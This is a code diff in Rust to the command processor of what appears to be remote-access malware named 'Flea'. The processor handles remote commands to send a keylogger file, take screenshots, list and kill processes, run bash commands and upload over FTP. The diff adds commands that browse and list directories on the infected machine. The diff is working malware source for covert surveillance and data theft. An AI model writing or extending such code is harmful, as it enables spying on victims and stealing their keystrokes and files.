@@ -3,9 +3,11 @@ extern crate repng;
 extern crate serde;
 
 use serde::{Serialize, Deserialize};
+use std::sync::{Arc, Mutex};
 use std::{str, fs::File, io::Read, env, path::PathBuf};
 use log::{debug, error};
 use chrono::{DateTime, Utc};
+use crate::fileserver::FileServer;
 use crate::{ftp::*, screenshot::Screenshot};
 use crate::systemcmd::*;
 use crate::keylogger::*;
@@ -19,6 +21,8 @@ const SEND_KEY_LOGGER_FILE_COMMAND: &'static str = "sendlog";
 const SEND_PROCESS_LIST_COMMAND: &'static str = "proclist";
 const KILL_COMMAND: &'static str = "kill";
 const UPLOAD_COMMAND: &'static str = "upload";
+const GET_FILES_COMMAND: &'static str = "getfiles";
+const CHANGE_DIRECTORY_COMMAND: &'static str = "cd";
 const UNKNOWN_COMMAND: &'static str = "Unknown command";
 
 //Enter your data for FTP Server connection
@@ -30,7 +34,7 @@ const FTP_FOLDER_NAME: &'static str = "enter_ftp_folder_name";
 pub trait FleaCommand
 {
     fn new() -> Self;
-    fn process(&self, cmd: &str, value: &str) -> String;
+    fn process(&mut self, cmd: &str, value: &str, file_server: &Arc<Mutex<FileServer>>) -> String;
 }
 
 #[derive(Serialize, Deserialize)]
@@ -104,6 +108,65 @@ impl CommandProcessor
         }
         s
     }
+
+    /// Converts string vector to String seperated with a new line
+    /// * data - a vector of strings to convert
+    /// * returns a string with a new line seperator
+    /// * Example: ["a", "b", "c"] -> "a
+    /// b
+    /// c"
+    /// * Example: [] -> ""
+    fn vec_to_string(&self, data: &Vec<String>) -> String
+    {
+        let mut s = String::new();
+        for d in data
+        {
+            s.push_str(&format!("{}\r\n", d));
+        }
+
+        s
+    }
+
+    fn change_directory(&mut self, value: &str, file_server: &Arc<Mutex<FileServer>>) -> String
+    {
+        if value == ".." 
+        {
+            match file_server.lock().unwrap().change_directory_up()
+            {
+                Ok(_) =>
+                {
+                    debug!("Directory changed");
+                    return "Directory changed".to_string();
+                },
+                Err(x) =>
+                {
+                    error!("Error: {}", x);
+                    return x.to_string();
+                }
+            }
+        }
+        else if value.len() == 0
+        {
+            debug!("Directory name is empty");
+            return "Directory name is empty".to_string();
+        }
+        else
+        {
+            match file_server.lock().unwrap().change_directory(value)
+            {
+                Ok(_) =>
+                {
+                    debug!("Directory changed");
+                    return "Directory changed".to_string();
+                },
+                Err(x) =>
+                {
+                    error!("Error: {}", x);
+                    return x.to_string();
+                }
+            }
+        }
+    }
 }
 
 impl FleaCommand for CommandProcessor
@@ -146,11 +209,11 @@ impl FleaCommand for CommandProcessor
             os: SystemCmd::new(),
         }
     }
-
+    
     /// A routine for processing incoming commands
     /// * cmd - a command in a form of a string
     /// * value - an additional data related to a command
-    fn process(&self, cmd: &str, value: &str) -> String
+    fn process(&mut self, cmd: &str, value: &str, file_server: &Arc<Mutex<FileServer>>) -> String
     {        
         match cmd
         {
@@ -193,6 +256,25 @@ impl FleaCommand for CommandProcessor
             SEND_PROCESS_LIST_COMMAND =>
             {
                 return self.os.get_process_list();
+            },
+
+            CHANGE_DIRECTORY_COMMAND =>
+            {
+                return self.change_directory(value, file_server);
+            },
+
+            GET_FILES_COMMAND =>
+            {
+                if let Ok(files) = file_server.lock().unwrap().get_curr_dir_content()
+                {
+                    debug!("Directory content returned");
+                    return self.vec_to_string(&files);
+                }
+                else 
+                {
+                    debug!("Couldn't get files");
+                    return "Couldn't get files".to_string();
+                }
             },
 
             GET_SCREENSHOT_COMMAND =>
@@ -280,25 +362,5 @@ impl FleaCommand for CommandProcessor
         }
 
         UNKNOWN_COMMAND.to_string()
-    }
-}
-
-#[cfg(test)]
-mod tests 
-{
-    use super::*;
-
-    #[test]    
-    fn process_test()
-    {
-        let p: CommandProcessor = FleaCommand::new();
-        let ret = p.process(GET_VERSION_COMMAND, "");
-        assert!(ret == p.version.to_string());
-
-        let ret = p.process("unknown command", "");
-        assert!(ret == UNKNOWN_COMMAND.to_string());
-
-        let ret = p.process(EXECUTE_BASH_COMMAND, "echo test");
-        assert!(ret.len() > 0);
     }
 }
